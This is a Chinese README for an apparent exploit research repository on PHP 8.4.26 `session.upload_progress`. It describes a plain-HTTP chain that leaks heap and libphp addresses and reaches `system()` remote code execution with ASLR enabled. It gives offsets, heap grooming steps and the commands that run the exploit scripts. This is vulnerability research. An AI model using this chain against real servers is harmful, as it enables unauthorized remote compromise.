# php2shell：PHP 8.4.26 `session.upload_progress` 纯 HTTP ASLR 绕过实验

本仓库记录在**授权实验环境**中，对 Debian 12 + Apache 2.4.68 prefork +
mod_php + PHP 8.4.26（官方源码自编译、未打补丁）的一组漏洞复现与利用研究。

> **复线声明**：本仓库全部成果均使用 **deepseek-v4-flash** 复线（复现验证）。

## 快速复现

以下命令在目标机（Apache/mod_php 本机）的仓库目录执行，脚本默认连接
`127.0.0.1:8088`。no-ASLR 地址与各阶段偏移绑定本实验构建，换环境需重新校准。

```bash
# 0) display_errors=0 一键链（只校验 display_errors=0，绝不修改配置；输出 chunk base）
#    sshpass -p '<LAB_PASSWORD>' ssh -t <LAB_USER>@<LAB_HOST> 'bash ~/demo_de0_leak.sh'

# 1) display_errors=0 手动分步（需 gdb；A-only 与 A+B forge）
./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103

# 2) no-ASLR 纯 HTTP RCE（需 display_errors=On，两个请求）
python3 tools/send_a_ps.py 17 19 3 12
python3 tools/send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"

# 3) ASLR-on 全链（需 display_errors=On；demo_aslr_video.sh 会临时设置并恢复）
CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
```

> 步骤 3 的 `trial_*.sh` 会重启本机 Apache 并挂 gdb，仅用于校准/取证；
> 实际攻击请求本身仍是普通 multipart HTTP。

约束：

- 攻击请求**只用普通 multipart HTTP**；
- 目标 webroot 只有普通页面（`<?php echo "OK\n"; ?>`，无 session 调用），
  **不放置任何目标相关 PHP 文件**；
- 不依赖从目标读取 `/proc/self/maps`；
- 所有命令执行/泄漏证据来自实验环境。

> 仅用于授权环境中的漏洞研究与复现。请勿用于未授权系统。

---

## 1. 结果摘要

### 1.1 no-ASLR 纯 HTTP RCE（已完成）

两个纯 HTTP 请求针对普通页面取得 `system()` 执行：

- A：`session.upload_progress` 的 pre-RINIT 回调中 OOM，留下跨请求悬空的
  `PS(http_session_vars)` reference；
- B：用 56B multipart 原始值缓冲区重占旧 reference，伪造 reference →
  HashTable → `pDestructor = system`，执行 `id>/tmp/p1`。

详见 [NOASLR_REPORT.md](NOASLR_REPORT.md)。

### 1.2 ASLR-on 纯 HTTP 全链（已完成，lab 5/5 / 9/10）

- 阶段 1：悬空 `PS(id)` + `send_cookie=1`，让 pre-RINIT 的 `Set-Cookie`
  通过 `php_url_encode` 做受控越界读，泄漏 Zend MM chunk base；
- 阶段 2：把 `PS(id)` 放到目标 HashTable 前，读
  `nTableSize|nInternalPointer` 和 `pDestructor=ZVAL_PTR_DTOR=libphp+0x613c50`，
  泄漏 libphp base；
- 阶段 3：`upload_progress` fake-ref → fake HashTable →
  `pDestructor=zif_system`（libphp+0x43a870，不需要 libc），执行 `id>/tmp/p1`；
- 阶段之间的 worker 轮换也改为纯 HTTP：`A_bigfields`（3MB 存活 POST 字符串 +
  12MB OOM）后让下一个会初始化 session 的请求触发 `abort()`，prefork 重 fork
  出 chunk/libphp 基址相同的新 worker。

实测：ASLR 开启下无开局轮换 5/5，带开局轮换 9/10。

详见 [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)、
[HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)。

### 1.3 不依赖 `display_errors` 的堆泄漏（已完成）

`display_errors=0` 时，警告不再产生输出，旧 A 依赖的
`headers_sent=1 → send_cookie FAILURE → php_session_abort()` 路径消失。
本仓库实现了替代原语：

- A 把内存精确填到 `real_size = memory_limit` 且 bin 128 为空，
  使 `php_session_send_cookie()` 内部 `php_url_encode()` 的
  `zend_string_safe_alloc(3, 32, 0, 0)`（121B → bin 128）OOM；
- OOM 发生在 `PS(send_cookie)=1` 之后，请求 bailout，留下悬空 `PS(id)`；
- B 先穿过 A 遗留的悬空 `PS(mod_data)`（把 stale 页变成 SRUN 页），
  再用两个大字段把 cached id chunk 铺到 page 510，使第二个字段的存活副本
  覆盖 page 511 并写入伪造 `zend_string` 头（`len=4000`）；
- `Set-Cookie` 解码后 4000 字节中有 47 个 chunk 内指针，可直接解出
  Zend MM chunk base；`php_rshutdown_session_globals` 释放悬空 id 时也不再
  panic。

实测（配置已确认 `display_errors=0`）：no-ASLR **3/3**、ASLR-on **2/2**。

详见 [DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md)。

### 1.4 目标页面不需要 `session_start`（已验证）

目标 `index.php` 仅为 `<?php echo "OK\n"; ?>`，没有任何 session 调用。
session 由 `session.upload_progress` 的 pre-RINIT 回调初始化（A 的
`FILE_START`、B 的 `MULTIPART_EVENT_END` cleanup），发生在脚本执行之前，
因此与页面是否调用 `session_start()` 无关。`display_errors=0` 的 page-511
forge 泄漏和旧 `display_errors=1` 阶段 1 泄漏都在该页面上成功（证据：
`logs/nosession_forge_20261021.resp`、`logs/nosession_classic_leak_20261021.resp`）。


---

## 2. 机制概览

```text
A  pre-RINIT upload_progress 回调 → php_session_initialize
   ├─ 空 PHPSESSID → 生成随机 id + PS(send_cookie)=1
   ├─ send_cookie 内部 url_encode 需要 bin 128
   ├─ 堆被填满：free_pages=0 且 bin 128 空
   └─ OOM bailout：PS(id) 悬空、send_cookie=1、mod_data 悬空、请求 teardown 跳过

B  pre-RINIT MULTIPART_EVENT_END → php_session_rfc1867_cleanup
   ├─ s_open：stale mod_data 的页被变成 SRUN → efree 不 panic
   ├─ initialize 复用悬空 id → php_session_send_cookie
   ├─ url_encode(PS(id)) 读取伪造 len：
   │    stage 1: 页内 freelist 指针 → chunk base
   │    stage 2: HashTable 的 pDestructor → libphp base
   └─ 响应 Set-Cookie 携带泄漏
```

终端使用 `zif_system`，只需要 chunk base + libphp base，不需要 libc。

---

## 3. 目录

| 路径 | 内容 |
|---|---|
| `NOASLR_REPORT.md` | no-ASLR 纯 HTTP RCE 报告 |
| `ASLR_PATHS.md` | ASLR 两条路径的分析与阻塞点记录 |
| `HTTP_HEAP_LEAK.md` | 纯 HTTP 堆泄漏（chunk base）机制/校准/证据 |
| `ASLR_PURE_HTTP.md` | ASLR 全链（堆泄漏 → libphp 泄漏 → zif_system） |
| `DISPLAY_ERRORS_OFF.md` | 不依赖 `display_errors` 的 OOM-in-cookie 与 page-511 forge |
| `tools/` | 各阶段请求脚本、校准脚本、gdb 探针 |
| `logs/` | 关键 gdb 轨迹与原始响应 |

核心工具：

- `tools/send_a_leak2.py` / `tools/b_numleak2.py`：阶段 1
- `tools/send_a_leak3.py` / `tools/b_target.py`：阶段 2
- `tools/send_a_pad.py` / `tools/send_b_zif.py`：阶段 3
- `tools/send_a_bigfields.py` / `tools/sup_poc.py`：纯 HTTP worker 轮换
- `tools/pure_aslr_run.sh`：全链驱动
- `tools/send_a_oom5.py` / `tools/send_b_open.py`：`display_errors=0` 路径
- `tools/trial_bins.sh` / `tools/trial_ab.sh` / `tools/g_bins.gdb`：校准与探针

---

## 4. 复现说明

这些脚本绑定本实验的 PHP 8.4.26 构建、`memory_limit=8M`、
`session.save_handler=files`、单 worker prefork 和对应请求形状；
换构建/配置/字段顺序需要重新标定偏移。

所有 Python 脚本默认连接实验机本地的 `127.0.0.1:8088`，应在目标机上运行
（或通过等价端口转发）。shell 脚本里的 `<LAB_HOST>` / `<LAB_PASSWORD>`
是脱敏占位符，复现时请替换为你自己的授权环境配置；脚本默认 `sudo -n`
可用。

最短复现路径：

```bash
# 阶段 1（旧 display_errors=On 链）
python3 tools/send_a_leak2.py 1001 12
python3 tools/b_numleak2.py 892 1 0x1000
python3 tools/decode_leak.py /tmp/b_numleak2.resp

# 不依赖 display_errors 的堆泄漏（需 gdb 校准；见 DISPLAY_ERRORS_OFF.md）
./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103
```

---

## 5. 限制与剩余工作

- 所有偏移绑定本实验构建与请求形状，换环境需重新校准；
- `display_errors=0` 路径目前完成了 **chunk base 泄漏**；
  stage-2（libphp 泄漏）与 stage-3（`zif_system`）需要按新 A 形状重新标定，
  详见 `DISPLAY_ERRORS_OFF.md` 第 6 节；
- 旧链（display_errors=On）的全链与纯 HTTP 轮换已验证；
- 泄漏/执行后 worker 可能按预期崩溃，这与一次利用的语义一致。

---

## 6. 免责声明

本项目仅用于授权环境中的漏洞研究、复现与防御验证。使用者应确保对目标
系统拥有明确授权，并遵守当地法律法规。
